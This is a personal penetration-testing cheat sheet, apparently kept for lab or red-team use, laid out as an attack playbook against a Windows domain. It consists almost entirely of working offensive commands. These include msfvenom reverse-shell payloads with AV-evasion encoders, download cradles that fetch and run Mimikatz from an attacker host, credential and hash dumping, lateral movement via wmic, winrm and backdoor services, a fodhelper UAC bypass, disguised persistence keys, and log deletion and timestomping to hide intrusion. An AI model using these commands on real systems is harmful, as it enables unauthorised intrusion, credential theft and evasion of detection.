Approach
- Scan and enumerate services in web-facing machines
- Enumerate webpages
- Look for vuln in web tech version, plugins
- SQLi, FI, file upload to get web shell and catch using nc
- Upload a meterpreter shell for foothold
- With foothold, add route and check arp
- Use portscan to find interesting servers, like DC, and enumerate domain users and machines (wevtutil)
- On Windows, always check for AV first!!! Msmpeng.exe == Windows Defender
- Find creds (pref domain admin) and pivot to other machines in the domain using wmic, net use, winrm
- Use other machines to access DC?

Troubleshooting

No shell

	- Can target reach back to kali? Check connection using DownloadString or IWR with a hosted file
	- Is firewall blocking traffic?
	- Is payload file still there? AV might have quarantined it
	- Is the process running?
	- Do I have permission to execute? icacls
	- Is the listening port open for bind shells? Is intermediate nodes listening?
	- Try different payload, bind/reverse, tcp/http?
	- Doublecheck multi/handler payload, IP, port

Command doesnt work

	- Is dir writeable? Do i have privs?
	- Powershell version?
	- Server reachable?
	- Pipe output to file to check 2>error.txt 1>result.txt
	- Escape "", or \\
	
Logging

	in msf
	show options
	set consolelogging true
	set sessionlogging true
	sudo cat /root/.msf4/logs/console.log


msfvenom
	
  - Reverse shells
  
        msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=11.11.133.111 LPORT=1234 -f elf -o service86.elf --ok!
        msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=11.11.133.111 LPORT=1234 -f elf -o service64.elf --ok!
        msfvenom -p  windows/meterpreter/reverse_tcp LHOST=11.11.133.111 LPORT=443 -a x86 -f exe -o services.exe --ok!
        msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.11.101 LPORT=7777 -f psh-cmd -o win.bat --ok!
        Run bat by just calling file

  - Bind Shell
  
	      msfvenom -p  windows/meterpreter/bind_tcp RHOST=192.168.11.172 LPORT=5555
  - encoders
	
		    cmd/powershell_base64 work!
	    	x86/shikata_ga_nai work! DO NOT use with symantec
	      -i 10
        
  - help
	
        --help-formats
	      msfvenom --list payloads 
	
  	If use hostname instead of IP addr for listener, must use HTTP instead of TCP


Meterpreter

	    arp
	    run post/windows/gather/enum_logged_on_users
			
  Bypass UAC - privesc when user is also local admin
  		
      use windows/local/bypassuac
	  	set session, LHOST
		  getsystem, or use incognito to impersonate token
 		  Then migrate to a svchost.exe process to dump hashes

  Screen grab
	
      migrate to a process with access to desktop, e.g. explorer
		  use espia
		  screengrab

  Keylogging
	
      keyscan_start
		  keyscan_dump
		  keyscan_stop
	
  Hashdump
	  	
      migrate to another process
		  getsystem
		  hashdump - dump local accounts only
	
  Registry
	
      reg queryval -k 'HKLM\System\CurrentControlSet\Control\Terminal Server\' -v fDenyTSConnections
	
	
  Portforward
	    
      To RDP, in meterpreter session: 
          
          portfwd add -l 5566 -p 3389 -r 192.168.11.155
          
			This will forward kalivps port 5566 to 192.168.11.155 thru the meterpreter session on web server
		      
          ssh -L 5555:localhost:5566 kali@kali1.vps.com to use local kali xfreerdp
	
Powershell

		Load powershell
		powershell_execute ''
		powershell_shell to get interactive PSshell
	

General Notes

    download "\\192.168.11.46\c$\$Recycle.bin\S-1-5-21-651069647-3627985350-1882987256-1108\$ION3GRF.pdf" --> need to escape \ in meterpreter



meterpreter incognito

    Note that you need elevated privs to steal tokens. Getsystem first
	use incognito
	list_tokens -u will show delegation (interactive logon) and impersonation tokens
	impersonate_token WIN-ADSCPKABBT3\\jack
	migrate to a process owned by jack to work


meterpreter mimikatz (need elevated privs)

    load kiwi
	kiwi_cmd log --> log to mimikatz.log
	kiwi_cmd sekurlsa::logonpasswords - get all accounts which are logged on, which could include domain accounts
	

msf smb/psexec

    Note that firewall must allow SMB-In
	Can set smbpass to LM:NTLM hash
	Can set rhost to IP of target, (could be another machine in the domain)
	if target account is local admin, then need to disable remote UAC by setting LocalAccountTokenFilterPolicy to 1


msf route

	route add <ip>/24 <session id>
	route flush
	route print

	or use autoroute and set session <session id>	


Transfer file on Windows
- SCP
  
    Copy from local to remote. Remote must enable ssh. sudo service ssh start
	    
      scp string.txt kali@10.200.2.28:~

- Certutil to download file
	
      certutil.exe -urlcache -f http://10.200.2.28:8080/1234shi.exe svc.exe

- Powershell

      powershell -c "(New-Object System.Net.WebClient).Downloadfile('http://10.200.2.28:8080/1234.exe', '1234.exe')";
	    powershell -c "Invoke-WebRequest -Uri 'http://10.200.2.28:8000/1234.exe' -outfile c:\users\todd\downloads\1234.exe" doesnt work on older PS versions (win 7, win server 2012)
      
- FTP
- SMB 


Powershell

	Bypass execution policy
		powershell -ep bypass <full path to ps1 file or .\script.ps1> - this will run the file

	$psversiontable
	
	Run commands
		& "[path] command" [arguments] [&]
		Treat path + command as a command instead of string, and run in bg

		$var = {script block}
		& $var
		powershell -ep bypass -command "& {. c:\programdata\Invoke-TokenManipulation.ps1; Invoke-TokenManipulation -enumerate }"
	
	Elevate a script
		start-process powershell '-noprofile -file script.ps1' -verb RunAs	
			However, using invoke-command to run as admin on remote computer will fail as the prompt for elevation runs in a non-interactive session on the remote machine.
	Run Script
		.\myscript.ps1
		& "c:\programdata tests\script.ps1"
	
	Register script to call function
		. c:\xxx\Invoke-Mimikatz.ps1
		Invoke-mimikatz 
		or
		
		Import-module .\Invoke-Mimikatz.ps1
		
		or
		powershell iex (New-Object System.Net.Webclient).DownloadString('http://10.200.2.28:8000/Invoke-Mimikatz.ps1');


Powersploit

    Invoke-TokenManipulation -Enumerate
	  Invoke-TokenManipulation -CreateProcess "cmd.exe" -username "nt authority\system" or "computername\user"
	  Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::pth "'
	  Invoke-Mimikatz -DumpCreds


Temp folders on Windows:

	- %userprofile%\AppData\Local\Temp
	userprofile = C:\users\todd
	- %systemdrive%\Windows\Temp (wont have permissions as normal user)
	c:\programdata
	c:\programdata\usoshared\logs


Hide file on Windows:

    attrib +h <filename>


Windows firewall 

	netsh advfirewall show allprofiles
	netsh advfirewall set allprofiles state off (need admin)
	netsh advfirewall set publicprofile state off 
	
	Open port
	netsh advfirewall firewall add rule name="svchostpassthrough" dir=in action=allow protocol=TCP localport=8888
	netsh advfirewall firewall show rule name="svchostpassthrough"
	

Authenticated Exploitation

	lolbins:	
	Remote access to files, registry
		net
		reg
	Remote execution
		wmic
		schtasks
	Remote shell
		WinRM
		RDP
		Powershell

	Other tools: psexec, crackmapexec, metasploit
	
Check Windows Logon logs

		wevtutil qe Security "/q:*[System [(EventID=4624)]]" | findstr WIN-C5BIRLGE6QH$ 
		wevtutil qe Security "/q:*[System [(EventID=4624)]]" /c:10 /f:text 
		wevtutil qe Security "/q:*[System [(EventID=4624)] and EventData[Data[@Name='TargetUserName']='ralph']]" /f:text /c:20
		wevtutil qe Security "/q:*[System [(EventID=4624)] and EventData[Data[@Name='IpAddress']='192.168.11.46']]" /f:text /c:5

Pivoting

		route add <ip of subnet>/24 <session id>
		Spin another meterpreter on local target network machine: use multi/handler and set lhost to gw machine. Payload also set lhost to gw machine

WMIC

		wmic /node:"DESKTOP-3HT3E3F" /user:"domain.local\admin" /password:"xxxx" /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get /format:list
		wmic /node:"DESKTOP-3HT3E3F" /user:"domain.local\admin" /password:"xxxx" os get * /format:list
		
		Test connection to kali
		wmic /node:"DESKTOP-XXXX" /user:"domain.local\domainadmin" /password:"xxx" process call create "xxx"
		process get caption, executablepath, commandline
		process where name="powershell.exe" call terminate
		"powershell -c \"(New-Object System.Net.WebClient).DownloadString('http://11.11.133.111:8000/test.html')\" > c:\users\ralph\appdata\test.txt"

Schedule Tasks
		
		schtasks /create /sc minute /mo 1 /tn "Ralphz" /f /tr c:\\users\\monty\\appdata\\sch.exe /ru SYSTEM /rl HIGHEST
		schtasks /create /sc minute /mo 1 /tr "c:\programdata\443enc.bat" /tn "bat" /f  --> may not be good as target screen will flash cmd

		schtasks | findstr Ralph
		schtasks /delete /tn "Ralphxx" /f
			Note that if schtasks invokes UAC, it will fail to run. Use /rl HIGHEST
		
		Run schtasks on remote computer
		schtasks /query /fo list /s \\192.168.11.172 /u user /p "xxx"


Check logs Microsoft-Windows-TaskScheduler/Operational

    wevtutil qe Microsoft-Windows-TaskScheduler/Operational "/q:*[System [(EventID=100)]]" /f:text /rd:true | findstr "echos2"
		wevtutil qe Microsoft-Windows-TaskScheduler/Operational /f:text /rd:true | findstr "echos2"
	
WinRM (default tcp port 5985, 5986)

		To enable: winrm qc -quiet
		To config to specific port: 
			winrm create
			winrm/config/Listener?Address=*+Transport=HTTP @{Port="1234"}
		To allow any IP host to use winrm
			winrm.cmd set winrm/config/client @{TrustedHosts="*"}
		To use winRS to connect to winrm server
			winrs -r:http://1.1.1.1:1234 -u:1.1.1.1\Administrator -p:password "cmd.exe"	
		Check
			winrm get winrm/config/client
			winrm get winrm/config/server
		Examples:	
		wmic /node:"192.168.11.154" /user:"Administrator" /password:"password" process call create "cmd.exe /c winrm qc -quiet && winrm.cmd set winrm/config/client @{TrustedHosts="*"}"
		wmic /node:"192.168.11.154" /user:"Administrator" /password:"password" process call create "cmd.exe /c winrm get winrm/config > c:\users\lisa\appdata\win.txt"	

		winrs -r:http://192.168.11.154:5985 -u:lisa -p:password "cmd.exe"
		For local account, put -u:win10lab\user
		Note: Do NOT put "" in username or password, will get access denied!
		Note that the client needs to trust the remote machine by setting TrustedHost
		Note that domain users need to be member of WinRMRemoteWMIUsers_ group
		Note that only local admins accounts can use winrm, non-admins must be member of Remote Management Users group and other permissions are required 
		
		If connecting using local admin account, need to set registry
		reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
	
	
  Powershell execute without touching disk
	
    wmic /node:"10.200.4.28" /user:"Administrator" /password:"P@ssw0rd" process call create "powershell.exe -ep bypass IEX (New-object System.Net.Webclient).DownloadString('http://10.200.2.28:8000/Invoke-Mimikatz.ps1'); Invoke-mimikatz -dumpcreds | out-file c:\\programdata\\creds.txt"
	
  Lateral movement using services
	
    net use \\remote\c$ /user:Administrator password
		dir \\remote\c$
		copy backdoor here
		Create service called backtome
		sc \\remote create backtome binpath=""
		sc \\remote start backtome
		
RDP

	Enable RDP
		reg query HKLM\System\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections
		reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
		netsh advfirewall firewall set rule group="remote desktop" new enable=yes

		wmic /node:"192.168.11.155" /user:"Administrator" /password:"assword" process call create "cmd.exe /c reg add \"HKLM\System\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f" 
		wmic /node:"192.168.11.155" /user:"Administrator" /password:"assword" process call create "cmd.exe /c netsh advfirewall firewall set rule group='remote desktop' new enable=yes"

	Disable RDP
		reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
		netsh advfirewall firewall set rule group="remote desktop" new enable=false


	Check RDP port 3389 is open
	In meterpreter session: portfwd add -l 5566 -p 3389 -r 192.168.11.155
	This will forward kalivps port 5566 to 192.168.11.155 thru the meterpreter session on web server
	Then on our own kali, port forward 5555 to 5566 on kali
	ssh -L 5555:localhost:5566 kali@IP.com
	Finally, connect to local port 5555
	xfreerdp /u:user /p:assword /v:localhost:5555 



Cracking hashes

	Prep the hash file: cat hashes | cut -d':' -f4 > nt.hashes
	hashcat -a 0 -m 1000 6e9b2ca0d079abbd39147ee0366de4ec
	john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT nt.hashes


Extracting files

    Rar
	"C:\Program Files\WinRAR\rar.exe" a -r -hp<password> archiv.rar *.txt *.exe
	tar -xf archive.tar
	unzip archive.zip


Stealth

	Scrub http server logs after scan?
	IIS Logs: %SystemDrive%\inetpub\logs\LogFiles
	Apache: /var/log/apache2/access.log
	
	Disguise UA
	Modify /usr/share/nmap/nselib/http.lua
	
	Clear bash history
	history -c
	
	idle/zombie scan -sI

	Delete all windows event logs
	del %WINDIR%\*.log /a/s/q/f
	
	Meterpreter
	clearev
	timestomp -z "01/01/2020 10:10:10" README.txt
	


Privesc
    
      From domain user to System
	use ms18_8120_win32k_privesc (win7, win2008)	
	DLL injection
	in meterpreter, upload /usr/share/metasploit-framework/data/exploits/CVE-2015-2426/reflective_dll.x64.dll
	Find a system-level process
	Use reflective_dll_inject post exploit module

	
	From local user to local admin
	exploit/windows/local/bypassuac
	
	From administrator to system
	meterpreter getsystem
	psexec -s -i cmd.exe
	 


Windows UAC Bypass

	Must have a medium integrity shell on Win10 where c:\windows\system32\fodhelper.exe exists
	reg add "HKCU\software\classes\ms-settings\shell\open\command" /v "DelegateExecute" /d ""
	reg add "HKCU\software\classes\ms-settings\shell\open\command" /v "" /d "cmd.exe /c powershell.exe"
	cmd.exe /c fodhelper.exe
	powershell start-process "c:\windows\system32\fodhelper.exe" -windowstyle hidden
	reg delete "HKCU\software\classes\ms-settings\shell\open\command" /va
	


Persistence

	On user login (may not work if user doesnt login)
	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v winupdate /t REG_SZ /d c:\users\administrator\appdata\local\temp\winupdate.bat
	reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v winupdate 


	On machine start (need admin)
	reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v winupdate /t REG_SZ /d c:\windows\system32\winupdate.bat
	
	Meterpreter
	run post/windows/manage/persistence_exe
	

